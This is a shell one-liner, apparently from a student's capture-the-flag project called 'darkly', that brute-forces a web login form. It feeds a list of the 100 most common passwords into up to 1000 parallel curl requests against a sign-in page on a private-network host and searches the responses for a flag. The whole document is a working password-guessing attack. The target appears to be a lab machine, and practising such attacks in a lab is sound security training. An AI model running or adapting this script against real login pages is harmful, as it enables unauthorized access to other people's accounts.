cat /home/wmonacho/Documents/Project_42/In_Progress_Project/darkly/login_brut_force/Ressources/100-most-common-passwords.csv | \
cut -d',' -f2 | \
xargs -P 1000 -I {} curl -sG "http://10.14.200.42/index.php" \
    --data-urlencode "page=signin" \
    --data-urlencode "username=GetTheFlag" \
    --data-urlencode "password={}" \
    --data-urlencode "Login=Login" | grep "flag"